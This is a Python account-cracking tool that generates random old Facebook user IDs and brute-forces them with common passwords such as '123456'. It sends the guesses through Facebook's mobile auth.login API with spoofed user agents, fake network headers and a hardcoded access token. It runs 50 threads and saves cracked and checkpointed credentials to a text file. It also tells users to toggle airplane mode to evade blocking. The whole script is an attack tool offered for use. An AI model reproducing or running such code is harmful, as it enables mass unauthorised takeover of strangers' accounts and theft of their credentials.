import os
try:
	import requests
except ImportError:
	os.system("pip install requests")
 
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")
 
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')


x = '\33[m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
K = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 


rug=[]
for xd in range(1000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    rug.append(ua)
	
	
def clear():
	os.system('clear')
logo="""A R MAMUN"""
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("	[1] 2009-10 cloning ")
		print("\033[0;91m     [E] Exit \n")
		DNH =input(" \033[0;93mChoose : ")
		if DNH in ["1", "01"]:
			self.old()
		if DNH in ["E", "e"]:
			exit()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			Main()
 
	def old(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=50) as coeg:
				listpass = ['123456','1234567','12345678','123456789','1234567890','123123','789789','420420','654321','@#@#@#']
				os.system("clear")
				print(logo)
				print("     \033[0;93m   FREE MODE ACTIVATE")
				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
				print(" \033[0;96m[+] Note: 0k Open 70% JUST NOW")
				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
				print("\033[0;94m----------------------------------------------")
				print("\n")
				print("\033[0;97m")
				for user in self.id:
					coeg.submit(self.api, user, listpass)
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ug=random.choice(rug)
		sys.stdout.write(
			"\r [Mamun]%s /%s -Ok:-%s | Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ug, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text:
				print("\r \033[0;92m[Mamun-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Mamun-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[Mamun-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Mamun-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
 
		self.loop +=1
 
 
if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
	else:
		Main()
 
try:Main()
except Exception as e:exit(str(e))
